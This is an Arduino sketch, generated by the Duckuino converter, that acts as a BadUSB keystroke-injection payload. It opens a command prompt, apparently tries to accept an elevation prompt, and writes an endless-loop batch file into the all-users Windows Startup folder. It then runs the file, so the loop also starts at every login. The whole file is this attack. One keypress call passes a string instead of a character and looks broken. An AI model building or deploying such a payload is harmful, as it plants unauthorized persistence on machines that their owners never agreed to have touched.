/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Nurrl/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print(F("cmd"));

  typeKey(KEY_RETURN);

  delay(200);
  typeKey(229);

  delay(100);
  Keyboard.print(F("a"));

  typeKey(KEY_RETURN);

  delay(200);
  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("cd %ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("copy con a.bat"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("@echo off"));

  typeKey(KEY_RETURN);

  Keyboard.print(F(":START"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("echo a"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("GOTO START"));

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press("z");
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print(F("a.bat"));

  typeKey(KEY_RETURN);



  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
